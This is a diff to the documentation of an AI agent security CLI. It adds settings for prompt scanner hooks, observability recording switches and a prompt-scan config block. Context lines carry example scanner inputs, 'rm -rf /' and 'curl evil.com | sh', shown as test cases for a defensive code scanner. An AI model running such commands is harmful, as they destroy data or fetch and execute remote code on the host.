@@ -94,6 +94,21 @@ agent-sec-cli scan-prompt warmup
 
 Model source: models are downloaded from ModelScope (Llama-Prompt-Guard-2-86M). Run `scan-prompt warmup` once after installation to eliminate cold-start latency.
 
+#### Host hook policy
+
+Set `PROMPT_SCANNER_HOOK_ENABLED=false` to skip prompt scanner hooks entirely. When enabled, the
+following variables override capability configuration:
+
+| Environment variable | Default | Behavior |
+|----------------------|---------|----------|
+| `PROMPT_SCANNER_HOOK_ENABLED` | `true` | Set to `false` to short-circuit the hook before input is read |
+| `PROMPT_SCANNER_MODE` | `observe` | `observe` audits silently; `warn` warns; `ask`/`block` enforce or fall back to `warn`; `deny` maps to `block` |
+| `PROMPT_SCANNER_SCAN_MODE` | `standard` | Scan strength: `fast` / `standard` / `strict` |
+| `PROMPT_SCANNER_TIMEOUT` | `10` | Scanner timeout in seconds |
+
+See the [Prompt Scanner User Guide](prompt-scanner.md) for full CLI options, verdict semantics, and
+Security Event details.
+
 ### Code Scanner
 
 Detects dangerous operations in bash and python code. Verdict enum: `pass` / `warn` / `deny` / `error`; built-in rules currently produce `warn` or `pass`.
@@ -108,6 +123,8 @@ agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language pyt
 # Use LLM engine (requires model backend)
 agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
 ```
+
+For per-agent hook environment variables and supported interaction modes, see [Code Scanner Hook Configuration](code-scanner.md).
 
 ### Skill Ledger
 
@@ -236,6 +253,21 @@ agent-sec-cli harden --downstream-help
 
 Interactive event review tool for auditing Agent behavior.
 
+The OpenClaw, Hermes, cosh, Qwen Code, Qoder, and Codex integrations enable
+their observability hooks by default. To disable hook recording, set
+`OBSERVABILITY_HOOK_ENABLED=false` before starting the host and restart the host
+after changing it. The variable accepts only `true` / `false` (ignoring case and
+surrounding whitespace); an unset or invalid value keeps recording enabled.
+
+For OpenClaw and Hermes, the existing observability capability `enabled` setting
+is an independent gate. Either switch can disable recording;
+`OBSERVABILITY_HOOK_ENABLED=true` does not override a capability disabled in
+plugin configuration.
+
+```bash
+export OBSERVABILITY_HOOK_ENABLED=false
+```
+
 ```bash
 # Open interactive TUI (requires interactive terminal)
 agent-sec-cli observability review
@@ -331,6 +363,11 @@ enable_block = false    # false=observe, true=block
 [capabilities.pii-scan-user-input]
 enabled = true
 timeout = 10
+
+[capabilities.prompt-scan-user-input]
+enabled = true
+timeout = 10
+enable_block = false    # false=observe, true=block
 
 [capabilities.skill-ledger]
 enabled = true
